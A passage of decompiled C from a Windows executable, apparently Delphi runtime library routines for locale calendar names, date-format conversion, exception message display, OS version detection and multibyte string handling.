  undefined *puStack_30;
  undefined *puStack_2c;
  undefined4 *local_1c;
  undefined4 *local_18;
  undefined4 *local_14;
  undefined4 *local_10;
  int local_c;
  LCID local_8;
  
  puStack_2c = &stack0xfffffffc;
  local_8 = 0;
  local_c = 0;
  local_10 = (undefined4 *)0x0;
  local_14 = (undefined4 *)0x0;
  local_18 = (undefined4 *)0x0;
  local_1c = (undefined4 *)0x0;
  puStack_30 = &LAB_0040a2ff;
  uStack_34 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_34;
  local_8 = GetThreadLocale();
  iVar1 = 1;
  piVar2 = (int *)&DAT_004196a0;
  piVar3 = (int *)&DAT_004196d0;
  do {
    FUN_0040a1b0(iVar1 + 0x43,iVar1 + -1,0x418188,(int *)&local_10,0xb,(int)&stack0xfffffffc);
    FUN_004040b0(piVar2,local_10);
    FUN_0040a1b0(iVar1 + 0x37,iVar1 + -1,0x4181b8,(int *)&local_14,0xb,(int)&stack0xfffffffc);
    FUN_004040b0(piVar3,local_14);
    iVar1 = iVar1 + 1;
    piVar3 = piVar3 + 1;
    piVar2 = piVar2 + 1;
  } while (iVar1 != 0xd);
  iVar1 = 1;
  piVar2 = (int *)&DAT_00419700;
  piVar3 = (int *)&DAT_0041971c;
  do {
    local_c = (iVar1 + 5) % 7;
    FUN_0040a1b0(local_c + 0x31,iVar1 + -1,0x4181e8,(int *)&local_18,6,(int)&stack0xfffffffc);
    FUN_004040b0(piVar2,local_18);
    FUN_0040a1b0(local_c + 0x2a,iVar1 + -1,0x418204,(int *)&local_1c,6,(int)&stack0xfffffffc);
    FUN_004040b0(piVar3,local_1c);
    iVar1 = iVar1 + 1;
    piVar3 = piVar3 + 1;
    piVar2 = piVar2 + 1;
  } while (iVar1 != 8);
  *in_FS_OFFSET = uStack_34;
  puStack_2c = &LAB_0040a306;
  puStack_30 = (undefined *)0x40a2fe;
  FUN_00404080((int *)&local_1c,4);
  return;
}



undefined4 FUN_0040a310(undefined param_1,undefined param_2,undefined param_3,undefined4 *param_4)

{
  int iVar1;
  
  iVar1 = 1;
  while( true ) {
    if (*(int *)(&DAT_00419744 + iVar1 * 4) == 0) {
      FUN_00404254((int *)(&DAT_00419744 + iVar1 * 4),param_4);
      return 1;
    }
    if (iVar1 == 7) break;
    iVar1 = iVar1 + 1;
  }
  return 0;
}



void FUN_0040a34c(undefined param_1,undefined param_2,undefined param_3,undefined4 *param_4)

{
  byte *pbVar1;
  int extraout_ECX;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_1c;
  undefined *puStack_18;
  undefined *puStack_14;
  byte *local_8;
  
  puStack_14 = &stack0xfffffffc;
  local_8 = (byte *)0x0;
  puStack_18 = &LAB_0040a3b1;
  uStack_1c = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_1c;
  for (iVar2 = 1; *(int *)(iVar2 * 4 + 0x419760) != -1; iVar2 = iVar2 + 1) {
    if (iVar2 == 7) goto LAB_0040a39b;
  }
  FUN_00404254((int *)&local_8,param_4);
  pbVar1 = FUN_00407398(local_8,(byte *)0x0,extraout_ECX);
  *(byte **)(iVar2 * 4 + 0x419760) = pbVar1;
LAB_0040a39b:
  *in_FS_OFFSET = uStack_1c;
  puStack_14 = &LAB_0040a3b8;
  puStack_18 = (undefined *)0x40a3b0;
  FUN_0040405c((int *)&local_8);
  return;
}



void FUN_0040a3c4(void)

{
  LCID LVar1;
  byte *Calendar;
  undefined4 *puVar2;
  int extraout_ECX;
  int iVar3;
  undefined4 *in_FS_OFFSET;
  byte *Calendar_00;
  byte **ppbVar4;
  CALTYPE CVar5;
  undefined4 uStack_18;
  undefined *puStack_14;
  undefined *puStack_10;
  byte *local_8;
  
  puStack_10 = &stack0xfffffffc;
  local_8 = (byte *)0x0;
  puStack_14 = &LAB_0040a45b;
  uStack_18 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_18;
  ppbVar4 = &local_8;
  LVar1 = GetThreadLocale();
  FUN_0040a13c(LVar1,0x100b,(undefined4 *)&DAT_0040a470,(int *)ppbVar4);
  Calendar = FUN_00407398(local_8,(byte *)0x1,extraout_ECX);
  if (Calendar + -3 < (byte *)0x3) {
    CVar5 = 4;
    Calendar_00 = Calendar;
    LVar1 = GetThreadLocale();
    EnumCalendarInfoA(FUN_0040a310,LVar1,(CALID)Calendar_00,CVar5);
    iVar3 = 7;
    puVar2 = &DAT_00419764;
    do {
      *puVar2 = 0xffffffff;
      puVar2 = puVar2 + 1;
      iVar3 = iVar3 + -1;
    } while (iVar3 != 0);
    CVar5 = 3;
    LVar1 = GetThreadLocale();
    EnumCalendarInfoA(FUN_0040a34c,LVar1,(CALID)Calendar,CVar5);
  }
  *in_FS_OFFSET = uStack_18;
  puStack_10 = &LAB_0040a462;
  puStack_14 = (undefined *)0x40a45a;
  FUN_0040405c((int *)&local_8);
  return;
}



void FUN_0040a474(undefined4 *param_1,int *param_2)

{
  char cVar1;
  bool bVar2;
  LCID LVar3;
  byte *pbVar4;
  int iVar5;
  uint uVar6;
  int extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  int iVar7;
  undefined4 *in_FS_OFFSET;
  byte **ppbVar8;
  undefined4 uStack_30;
  undefined *puStack_2c;
  undefined *puStack_28;
  undefined4 *local_18;
  undefined4 *local_14;
  undefined4 *local_10;
  byte *local_c;
  uint local_8;
  
  puStack_28 = &stack0xfffffffc;
  local_8 = 0;
  local_c = (byte *)0x0;
  local_10 = (undefined4 *)0x0;
  local_14 = (undefined4 *)0x0;
  local_18 = (undefined4 *)0x0;
  puStack_2c = &LAB_0040a63e;
  uStack_30 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_30;
  iVar7 = 1;
  FUN_0040405c(param_2);
  ppbVar8 = &local_c;
  LVar3 = GetThreadLocale();
  FUN_0040a13c(LVar3,0x1009,(undefined4 *)&DAT_0040a654,(int *)ppbVar8);
  pbVar4 = FUN_00407398(local_c,(byte *)0x1,extraout_ECX);
  if (pbVar4 + -3 < (byte *)0x3) {
    while (iVar5 = FUN_004042f8((int)param_1), iVar7 <= iVar5) {
      uVar6 = (uint)*(byte *)((int)param_1 + iVar7 + -1);
      if ((*(byte *)((int)&DAT_00418110 + ((int)uVar6 >> 3)) >> (uVar6 & 7) & 1) == 0) {
        iVar5 = FUN_00407a8c((char *)((int)param_1 + iVar7 + -1),&DAT_0040a658,2);
        if (iVar5 == 0) {
          FUN_00404300(param_2,(undefined4 *)&DAT_0040a664);
          iVar7 = iVar7 + 1;
        }
        else {
          iVar5 = FUN_00407a8c((char *)((int)param_1 + iVar7 + -1),&DAT_0040a668,4);
          if (iVar5 == 0) {
            FUN_00404300(param_2,(undefined4 *)&DAT_0040a678);
            iVar7 = iVar7 + 3;
          }
          else {
            iVar5 = FUN_00407a8c((char *)((int)param_1 + iVar7 + -1),&DAT_0040a680,2);
            if (iVar5 == 0) {
              FUN_00404300(param_2,(undefined4 *)&DAT_0040a68c);
              iVar7 = iVar7 + 1;
            }
            else {
              cVar1 = *(char *)((int)param_1 + iVar7 + -1);
              if ((cVar1 == 'Y') || (cVar1 == 'y')) {
                FUN_00404300(param_2,(undefined4 *)&LAB_0040a698);
              }
              else {
                FUN_00404244((int *)&local_18,
                             CONCAT31((int3)((uint)extraout_EDX_00 >> 8),
                                      *(undefined *)((int)param_1 + iVar7 + -1)));
                FUN_00404300(param_2,local_18);
              }
            }
          }
        }
        iVar7 = iVar7 + 1;
      }
      else {
        local_8 = FUN_0040b3d8((undefined *)param_1,iVar7);
        FUN_00404558((int)param_1,iVar7,local_8,(int *)&local_14);
        FUN_00404300(param_2,local_14);
        iVar7 = iVar7 + local_8;
      }
    }
  }
  else {
    if ((DAT_0041973c == 4) || (DAT_0041973c - 0x11U < 2)) {
      bVar2 = true;
    }
    else {
      bVar2 = false;
    }
    if (bVar2) {
      for (; iVar5 = FUN_004042f8((int)param_1), iVar7 <= iVar5; iVar7 = iVar7 + 1) {
        cVar1 = *(char *)((int)param_1 + iVar7 + -1);
        if ((cVar1 != 'G') && (cVar1 != 'g')) {
          FUN_00404244((int *)&local_10,
                       CONCAT31((int3)((uint)extraout_EDX >> 8),
                                *(undefined *)((int)param_1 + iVar7 + -1)));
          FUN_00404300(param_2,local_10);
        }
      }
    }
    else {
      FUN_004040b0(param_2,param_1);
    }
  }
  *in_FS_OFFSET = uStack_30;
  puStack_28 = &LAB_0040a645;
  puStack_2c = (undefined *)0x40a63d;
  FUN_00404080((int *)&local_18,4);
  return;
}



void FUN_0040a6a8(int *param_1,LPCVOID param_2,byte *param_3,byte *param_4)

{
  DWORD DVar1;
  char *pcVar2;
  undefined4 uVar3;
  int iVar4;
  HINSTANCE hInstance;
  undefined *puVar5;
  UINT uID;
  byte *lpBuffer;
  byte local_45c [256];
  byte *local_35c;
  undefined local_358;
  undefined4 *local_354;
  undefined local_350;
  int local_34c;
  undefined local_348;
  char *local_344;
  undefined local_340;
  undefined *local_33c;
  undefined local_338;
  _MEMORY_BASIC_INFORMATION local_334;
  byte local_316 [256];
  byte local_216 [261];
  undefined4 local_111 [65];
  int local_c;
  byte *local_8;
  
  local_8 = param_3;
  VirtualQuery(param_2,&local_334,0x1c);
  if (local_334.State == 0x1000) {
    DVar1 = GetModuleFileNameA((HMODULE)local_334.AllocationBase,(LPSTR)local_216,0x105);
    if (DVar1 != 0) {
      local_c = (int)param_2 - (int)local_334.AllocationBase;
      goto LAB_0040a71e;
    }
  }
  GetModuleFileNameA(DAT_00419660,(LPSTR)local_216,0x105);
  local_c = func_0x0040a69c(param_2);
LAB_0040a71e:
  pcVar2 = FUN_0040b56c(local_216,'\\');
  FUN_00407a58(local_111,(undefined4 *)(pcVar2 + 1),0x104);
  pcVar2 = &DAT_0040a828;
  puVar5 = &DAT_0040a828;
  uVar3 = FUN_00403734(param_1,(int)PTR_DAT_00406434);
  if ((char)uVar3 != '\0') {
    pcVar2 = FUN_004044f8((undefined *)param_1[1]);
    iVar4 = FUN_00407a30(pcVar2);
    if ((iVar4 != 0) && (pcVar2[iVar4 + -1] != '.')) {
      puVar5 = &DAT_0040a82c;
    }
  }
  iVar4 = 0x100;
  lpBuffer = local_316;
  uID = *(UINT *)(PTR_PTR_DAT_004186d8 + 4);
  hInstance = (HINSTANCE)FUN_00405068((int)DAT_00419660);
  LoadStringA(hInstance,uID,(LPSTR)lpBuffer,iVar4);
  FUN_00403520(*param_1,local_45c);
  local_35c = local_45c;
  local_358 = 4;
  local_354 = local_111;
  local_350 = 6;
  local_34c = local_c;
  local_348 = 5;
  local_340 = 6;
  local_338 = 6;
  local_344 = pcVar2;
  local_33c = puVar5;
  FUN_00407f78(local_8,param_4,local_316,4,&local_35c);
  FUN_00407a30((char *)local_8);
  return;
}



void FUN_0040a830(int *param_1,LPCVOID param_2)

{
  DWORD DVar1;
  HANDLE pvVar2;
  HINSTANCE hInstance;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  byte *lpBuffer;
  undefined *lpBuffer_00;
  UINT uID;
  DWORD *pDVar3;
  CHAR *lpBuffer_01;
  LPOVERLAPPED p_Var4;
  int cchBufferMax;
  DWORD local_444;
  CHAR local_440 [64];
  byte local_400 [1024];
  
  FUN_0040a6a8(param_1,param_2,local_400,(byte *)0x400);
  pDVar3 = &local_444;
  if (*PTR_DAT_00418664 == '\0') {
    cchBufferMax = 0x40;
    lpBuffer_01 = local_440;
    uID = *(UINT *)(PTR_PTR_DAT_00418540 + 4);
    hInstance = (HINSTANCE)FUN_00405068(DAT_00419660);
    LoadStringA(hInstance,uID,lpBuffer_01,cchBufferMax);
    MessageBoxA((HWND)0x0,(LPCSTR)local_400,local_440,0x2010);
  }
  else {
    FUN_00402dd8(PTR_DAT_00418564,extraout_EDX,extraout_ECX);
    FUN_00402784();
    CharToOemA((LPCSTR)local_400,(LPSTR)local_400);
    p_Var4 = (LPOVERLAPPED)0x0;
    DVar1 = FUN_00407a30((char *)local_400);
    lpBuffer = local_400;
    pvVar2 = GetStdHandle(0xfffffff4);
    WriteFile(pvVar2,lpBuffer,DVar1,pDVar3,p_Var4);
    pDVar3 = &local_444;
    p_Var4 = (LPOVERLAPPED)0x0;
    DVar1 = 2;
    lpBuffer_00 = &DAT_0040a8f4;
    pvVar2 = GetStdHandle(0xfffffff4);
    WriteFile(pvVar2,lpBuffer_00,DVar1,pDVar3,p_Var4);
  }
  return;
}



int * FUN_0040a8f8(int *param_1,char param_2,undefined4 *param_3)

{
  undefined4 *extraout_ECX;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe4;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_004037f0((int)param_1,param_2,param_3,in_stack_ffffffe4,in_stack_ffffffe8,
                                  in_stack_ffffffec,in_stack_fffffff0);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  FUN_004040b0(param_1 + 1,param_3);
  if (param_2 != '\0') {
    FUN_00403848(param_1);
    *in_FS_OFFSET = in_stack_ffffffe4;
  }
  return param_1;
}



void FUN_0040a934(int param_1,char param_2,byte *param_3,undefined4 param_4,undefined4 param_5)

{
  byte *extraout_ECX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_30;
  undefined *puStack_2c;
  undefined *puStack_28;
  undefined4 in_stack_ffffffdc;
  undefined4 in_stack_ffffffe0;
  undefined4 in_stack_ffffffe4;
  undefined4 in_stack_ffffffe8;
  undefined4 *local_8;
  
  local_8 = (undefined4 *)0x0;
  if (param_2 != '\0') {
    puStack_28 = (undefined *)0x40a948;
    param_1 = FUN_004037f0(param_1,param_2,param_3,in_stack_ffffffdc,in_stack_ffffffe0,
                           in_stack_ffffffe4,in_stack_ffffffe8);
    param_3 = extraout_ECX;
  }
  puStack_2c = &LAB_0040a98e;
  uStack_30 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_30;
  puStack_28 = &stack0xfffffffc;
  FUN_00407fb8(param_3,param_5,param_4,(byte **)&local_8);
  FUN_004040b0((int *)(param_1 + 4),local_8);
  *in_FS_OFFSET = uStack_30;
  puStack_28 = &LAB_0040a995;
  puStack_2c = (undefined *)0x40a98d;
  FUN_0040405c((int *)&local_8);
  return;
}



int * FUN_0040a9b4(int *param_1,char param_2,int **param_3)

{
  int **extraout_ECX;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe4;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_004037f0((int)param_1,param_2,param_3,in_stack_ffffffe4,in_stack_ffffffe8,
                                  in_stack_ffffffec,in_stack_fffffff0);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  FUN_00405ac0(param_3,param_1 + 1);
  if (param_2 != '\0') {
    FUN_00403848(param_1);
    *in_FS_OFFSET = in_stack_ffffffe4;
  }
  return param_1;
}



void FUN_0040a9f0(int param_1,char param_2,int **param_3,undefined4 param_4,undefined4 param_5)

{
  int **extraout_ECX;
  undefined4 *in_FS_OFFSET;
  undefined4 **ppuVar1;
  undefined4 uStack_34;
  undefined *puStack_30;
  undefined *puStack_2c;
  undefined4 in_stack_ffffffd8;
  undefined4 in_stack_ffffffdc;
  undefined4 in_stack_ffffffe0;
  undefined4 in_stack_ffffffe4;
  byte *local_c;
  undefined4 *local_8;
  
  local_8 = (undefined4 *)0x0;
  local_c = (byte *)0x0;
  if (param_2 != '\0') {
    puStack_2c = (undefined *)0x40aa06;
    param_1 = FUN_004037f0(param_1,param_2,param_3,in_stack_ffffffd8,in_stack_ffffffdc,
                           in_stack_ffffffe0,in_stack_ffffffe4);
    param_3 = extraout_ECX;
  }
  puStack_30 = &LAB_0040aa5c;
  uStack_34 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_34;
  ppuVar1 = &local_8;
  puStack_2c = &stack0xfffffffc;
  FUN_00405ac0(param_3,(int *)&local_c);
  FUN_00407fb8(local_c,param_5,param_4,(byte **)ppuVar1);
  FUN_004040b0((int *)(param_1 + 4),local_8);
  *in_FS_OFFSET = uStack_34;
  puStack_2c = &LAB_0040aa63;
  puStack_30 = (undefined *)0x40aa5b;
  FUN_00404080((int *)&local_c,2);
  return;
}



void FUN_0040aab0(void)

{
  int iVar1;
  int *piVar2;
  int iVar3;
  int local_10;
  undefined local_c;
  
  iVar1 = FUN_00402870();
  for (iVar3 = 0; (iVar3 < 7 && (iVar1 != (&DAT_00418220)[iVar3 * 2])); iVar3 = iVar3 + 1) {
  }
  if (iVar3 < 7) {
    piVar2 = FUN_0040a8f8((int *)PTR_DAT_00406554,'\x01',(undefined4 *)(&DAT_00418224)[iVar3 * 2]);
  }
  else {
    local_c = 0;
    local_10 = iVar1;
    piVar2 = (int *)FUN_0040a9f0((int)PTR_DAT_00406554,'\x01',(int **)PTR_PTR_DAT_0041853c,0,
                                 &local_10);
  }
  piVar2[3] = iVar1;
  return;
}



void FUN_0040ab84(int param_1,undefined4 param_2,undefined4 param_3)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uVar1;
  int *piVar2;
  undefined *puStack_3c;
  undefined *puStack_38;
  undefined *puStack_34;
  byte *local_24;
  int local_20;
  undefined local_1c;
  undefined4 local_18;
  undefined local_14;
  undefined4 local_10;
  undefined local_c;
  int local_8;
  
  puStack_34 = &stack0xfffffffc;
  local_24 = (byte *)0x0;
  local_8 = 0;
  puStack_38 = &LAB_0040ac20;
  puStack_3c = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = &puStack_3c;
  if (param_1 == 0) {
    FUN_00405ac0((int **)PTR_PTR_DAT_00418658,&local_8);
  }
  else {
    puStack_34 = &stack0xfffffffc;
    FUN_004040f4(&local_8,param_1);
  }
  local_20 = local_8;
  local_1c = 0xb;
  local_14 = 0xb;
  local_c = 0;
  piVar2 = &local_20;
  uVar1 = 2;
  local_18 = param_2;
  local_10 = param_3;
  FUN_00405ac0((int **)PTR_PTR_DAT_0041868c,(int *)&local_24);
  FUN_0040a934((int)PTR_DAT_00406c5c,'\x01',local_24,uVar1,piVar2);
  *in_FS_OFFSET = uVar1;
  puStack_3c = &LAB_0040ac27;
  FUN_0040405c((int *)&local_24);
  FUN_0040405c(&local_8);
  return;
}



void FUN_0040ac30(int param_1,undefined4 param_2,undefined4 *param_3)

{
  *param_3 = param_2;
  FUN_00403abc(param_1);
  return;
}



undefined4 FUN_0040ac74(int *param_1)

{
  int iVar1;
  undefined3 uVar3;
  int iVar2;
  
  iVar1 = *param_1;
  uVar3 = (undefined3)((uint)iVar1 >> 8);
  if (iVar1 < -0x3fffff6d) {
    iVar2 = iVar1;
    if (iVar1 == -0x3fffff6e) {
LAB_0040acd8:
      return CONCAT31((int3)((uint)iVar2 >> 8),6);
    }
    if (iVar1 < -0x3fffff71) {
      if (iVar1 == -0x3fffff72) {
        return CONCAT31(uVar3,7);
      }
      if (iVar1 == -0x3ffffffb) {
        return 0xb;
      }
      if (iVar1 == -0x3fffff74) {
        return 4;
      }
      iVar2 = iVar1 + 0x3fffff73;
      if (iVar2 == 0) goto LAB_0040ace1;
    }
    else {
      iVar2 = iVar1 + 0x3fffff6f;
      if (iVar1 + 0x3fffff71U < 2) goto LAB_0040acd8;
      if (iVar2 == 0) {
        return 8;
      }
    }
  }
  else if (iVar1 < -0x3fffff69) {
    if (iVar1 == -0x3fffff6a) {
      return CONCAT31(uVar3,0xc);
    }
    iVar2 = iVar1 + 0x3fffff6d;
    if (iVar2 == 0) {
LAB_0040ace1:
      return CONCAT31((int3)((uint)iVar2 >> 8),9);
    }
    if (iVar1 == -0x3fffff6c) {
      return 3;
    }
    iVar2 = iVar1 + 0x3fffff6b;
    if (iVar2 == 0) {
      return 5;
    }
  }
  else {
    if (iVar1 == -0x3fffff03) {
      return 0xe;
    }
    iVar2 = iVar1 + 0x3ffffec6;
    if (iVar2 == 0) {
      return 0xd;
    }
  }
  return CONCAT31((int3)((uint)iVar2 >> 8),0x16);
}



undefined4 FUN_0040acf4(int *param_1)

{
  uint uVar1;
  
  uVar1 = FUN_0040ac74(param_1);
  return *(undefined4 *)(&DAT_00418240 + (uVar1 & 0xff) * 8);
}



void FUN_0040ad0c(undefined param_1,undefined param_2,undefined param_3,int param_4)

{
  int iVar1;
  undefined4 uVar2;
  DWORD DVar3;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar4;
  undefined4 *puVar5;
  undefined *puStack_188;
  undefined *puStack_184;
  undefined *puStack_180;
  byte *local_174;
  undefined4 local_170;
  undefined local_16c;
  int local_168;
  undefined local_164;
  undefined4 local_160;
  undefined local_15c;
  byte *local_158;
  undefined *local_154;
  int local_150;
  undefined4 local_14c;
  undefined local_148;
  int local_144;
  undefined local_140;
  int local_13c;
  undefined local_138;
  undefined4 local_134;
  undefined local_130;
  undefined4 local_129 [65];
  _MEMORY_BASIC_INFORMATION local_24;
  int local_8;
  
  puStack_180 = &stack0xfffffffc;
  local_174 = (byte *)0x0;
  local_150 = 0;
  local_158 = (byte *)0x0;
  local_154 = (undefined *)0x0;
  local_8 = 0;
  puStack_184 = &LAB_0040aec7;
  puStack_188 = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = &puStack_188;
  iVar1 = *(int *)(param_4 + -4);
  if (*(int *)(iVar1 + 0x14) == 0) {
    puStack_180 = &stack0xfffffffc;
    FUN_00405ac0((int **)PTR_PTR_DAT_004186ec,&local_8);
  }
  else {
    FUN_00405ac0((int **)PTR_PTR_DAT_00418638,&local_8);
  }
  uVar2 = *(undefined4 *)(iVar1 + 0x18);
  VirtualQuery(*(LPCVOID *)(iVar1 + 0xc),&local_24,0x1c);
  if (local_24.State == 0x1000) {
    DVar3 = GetModuleFileNameA((HMODULE)local_24.AllocationBase,(LPSTR)local_129,0x105);
    if (DVar3 != 0) {
      local_14c = *(undefined4 *)(iVar1 + 0xc);
      local_148 = 5;
      FUN_004042cc((int *)&local_154,local_129,0x105);
      FUN_00407908(local_154,&local_150);
      local_144 = local_150;
      local_140 = 0xb;
      local_13c = local_8;
      local_138 = 0xb;
      local_130 = 5;
      puVar5 = &local_14c;
      uVar4 = 3;
      local_134 = uVar2;
      FUN_00405ac0((int **)PTR_PTR_DAT_0041867c,(int *)&local_158);
      FUN_0040a934((int)PTR_DAT_00406a94,'\x01',local_158,uVar4,puVar5);
      goto LAB_0040ae96;
    }
  }
  local_170 = *(undefined4 *)(iVar1 + 0xc);
  local_16c = 5;
  local_168 = local_8;
  local_164 = 0xb;
  local_15c = 5;
  puVar5 = &local_170;
  uVar4 = 2;
  local_160 = uVar2;
  FUN_00405ac0((int **)PTR_PTR_DAT_00418640,(int *)&local_174);
  FUN_0040a934((int)PTR_DAT_00406a94,'\x01',local_174,uVar4,puVar5);
LAB_0040ae96:
  *in_FS_OFFSET = uVar4;
  puStack_188 = &LAB_0040aece;
  FUN_0040405c((int *)&local_174);
  FUN_00404080((int *)&local_158,3);
  FUN_0040405c(&local_8);
  return;
}



void FUN_0040afb4(void)

{
  DAT_0041978c = FUN_0040a9b4((int *)PTR_DAT_004064f8,'\x01',(int **)PTR_PTR_DAT_00418544);
  DAT_00419790 = FUN_0040a9b4((int *)PTR_DAT_00406980,'\x01',(int **)PTR_PTR_DAT_00418614);
  *(undefined **)PTR_DAT_0041850c = &LAB_0040ab30;
  *(undefined **)PTR_DAT_00418574 = &LAB_0040afa4;
  *(undefined **)PTR_DAT_00418538 = PTR_DAT_00406434;
  *(code **)PTR_DAT_0041856c = FUN_0040acf4;
  *(undefined **)PTR_DAT_00418578 = &LAB_0040aed8;
  *(undefined **)PTR_DAT_00418628 = &LAB_0040ac40;
  *(undefined **)PTR_DAT_004184fc = &LAB_0040ac5c;
  return;
}



void FUN_0040b038(void)

{
  if (DAT_0041978c != (int *)0x0) {
    *(undefined *)(DAT_0041978c + 3) = 1;
    (**(code **)(*DAT_0041978c + -8))();
    DAT_0041978c = (int *)0x0;
  }
  if (DAT_00419790 != (int *)0x0) {
    *(undefined *)(DAT_00419790 + 3) = 1;
    FUN_004035a8(DAT_00419790);
    DAT_00419790 = (int *)0x0;
  }
  *(undefined4 *)PTR_DAT_0041850c = 0;
  *(undefined4 *)PTR_DAT_00418574 = 0;
  *(undefined4 *)PTR_DAT_00418538 = 0;
  *(undefined4 *)PTR_DAT_0041856c = 0;
  *(undefined4 *)PTR_DAT_00418578 = 0;
  *(undefined4 *)PTR_DAT_00418628 = 0;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0040b0b8(void)

{
  BOOL BVar1;
  _OSVERSIONINFOA local_94;
  
  local_94.dwOSVersionInfoSize = 0x94;
  BVar1 = GetVersionExA(&local_94);
  if (BVar1 != 0) {
    DAT_004180c8 = local_94.dwPlatformId;
    _DAT_004180cc = local_94.dwMajorVersion;
    _DAT_004180d0 = local_94.dwMinorVersion;
    if (local_94.dwPlatformId == 1) {
      _DAT_004180d4 = local_94.dwBuildNumber & 0xffff;
    }
    else {
      _DAT_004180d4 = local_94.dwBuildNumber;
    }
    FUN_004042cc((int *)&DAT_004180d8,(undefined4 *)local_94.szCSDVersion,0x80);
  }
  return;
}



undefined4 FUN_0040b128(byte *param_1,int param_2)

{
  uint uVar1;
  undefined4 uVar2;
  int iVar3;
  
  uVar2 = 0;
  if ((param_1 != (byte *)0x0) && (param_1[param_2] != 0)) {
    if (param_2 == 0) {
      if ((*(byte *)((int)&DAT_00418110 + ((int)(uint)*param_1 >> 3)) >> (*param_1 & 7) & 1) != 0) {
        uVar2 = 1;
      }
    }
    else {
      iVar3 = param_2 + -1;
      while ((-1 < iVar3 &&
             ((*(byte *)((int)&DAT_00418110 + ((int)(uint)param_1[iVar3] >> 3)) >>
               (param_1[iVar3] & 7) & 1) != 0))) {
        iVar3 = iVar3 + -1;
      }
      uVar1 = param_2 - iVar3 & 0x80000001;
      if ((int)uVar1 < 0) {
        uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;
      }
      if (uVar1 == 0) {
        uVar2 = 2;
      }
      else if ((*(byte *)((int)&DAT_00418110 + ((int)(uint)param_1[param_2] >> 3)) >>
                (param_1[param_2] & 7) & 1) != 0) {
        uVar2 = 1;
      }
    }
  }
  return uVar2;
}



undefined4 FUN_0040b1a0(undefined *param_1,int param_2)

{
  undefined4 uVar1;
  byte *pbVar2;
  
  uVar1 = 0;
  if (DAT_00419744 != '\0') {
    pbVar2 = FUN_004044f8(param_1);
    uVar1 = FUN_0040b128(pbVar2,param_2 + -1);
  }
  return uVar1;
}



undefined4 FUN_0040b1c4(byte *param_1,int param_2)

{
  undefined4 uVar1;
  
  uVar1 = 0;
  if (DAT_00419744 != '\0') {
    uVar1 = FUN_0040b128(param_1,param_2);
  }
  return uVar1;
}



void FUN_0040b1dc(undefined *param_1,int param_2)

{
  int iVar1;
  
  iVar1 = FUN_004042f8((int)param_1);
  if (iVar1 < param_2) {
    param_2 = FUN_004042f8((int)param_1);
  }
  FUN_0040b204(param_1,param_2);
  return;
}



int FUN_0040b204(undefined *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  
  iVar2 = 0;
  if (0 < param_2) {
    iVar1 = FUN_004042f8((int)param_1);
    if ((param_2 <= iVar1) && (iVar2 = param_2, DAT_00419744 != '\0')) {
      iVar1 = 1;
      iVar2 = 0;
      if (0 < param_2) {
        do {
          if ((*(byte *)((int)&DAT_00418110 + ((int)(uint)(byte)param_1[iVar1 + -1] >> 3)) >>
               ((byte)param_1[iVar1 + -1] & 7) & 1) == 0) {
            iVar1 = iVar1 + 1;
          }
          else {
            iVar1 = FUN_0040b414(param_1,iVar1);
          }
          iVar2 = iVar2 + 1;
        } while (iVar1 <= param_2);
      }
    }
  }
  return iVar2;
}



void FUN_0040b25c(undefined *param_1,int param_2,int *param_3,int *param_4)

{
  int iVar1;
  int iVar2;
  int iVar3;
  
  iVar1 = FUN_004042f8((int)param_1);
  iVar3 = 1;
  iVar2 = 1;
  while ((iVar2 < iVar1 && (iVar3 < param_2))) {
    iVar3 = iVar3 + 1;
    if ((*(byte *)((int)&DAT_00418110 + ((int)(uint)(byte)param_1[iVar2 + -1] >> 3)) >>
         ((byte)param_1[iVar2 + -1] & 7) & 1) == 0) {
      iVar2 = iVar2 + 1;
    }
    else {
      iVar2 = FUN_0040b414(param_1,iVar2);
    }
  }
  if (((iVar3 == param_2) && (iVar2 < iVar1)) &&
     ((*(byte *)((int)&DAT_00418110 + ((int)(uint)(byte)param_1[iVar2 + -1] >> 3)) >>
       ((byte)param_1[iVar2 + -1] & 7) & 1) != 0)) {
    iVar2 = FUN_0040b414(param_1,iVar2);
    iVar2 = iVar2 + -1;
  }
  *param_3 = iVar3;
  *param_4 = iVar2;
  return;
}



int FUN_0040b2ec(undefined *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  int local_10;
  int local_c;
  
  local_10 = 0;
  iVar2 = local_10;
  if ((((0 < param_2) && (iVar1 = FUN_004042f8((int)param_1), iVar2 = local_10, param_2 <= iVar1))
      && (iVar2 = param_2, 1 < param_2)) && (iVar2 = param_2, DAT_00419744 != '\0')) {
    FUN_0040b25c(param_1,param_2 + -1,&local_c,&local_10);
    if ((local_c < param_2 + -1) || (iVar2 = FUN_004042f8((int)param_1), iVar2 <= local_10)) {
      local_10 = 0;
      iVar2 = local_10;
    }
    else {
      iVar2 = local_10 + 1;
    }
  }
  local_10 = iVar2;
  return local_10;
}



int FUN_0040b350(undefined *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  int local_10;
  int local_c;
  
  local_10 = 0;
  iVar1 = local_10;
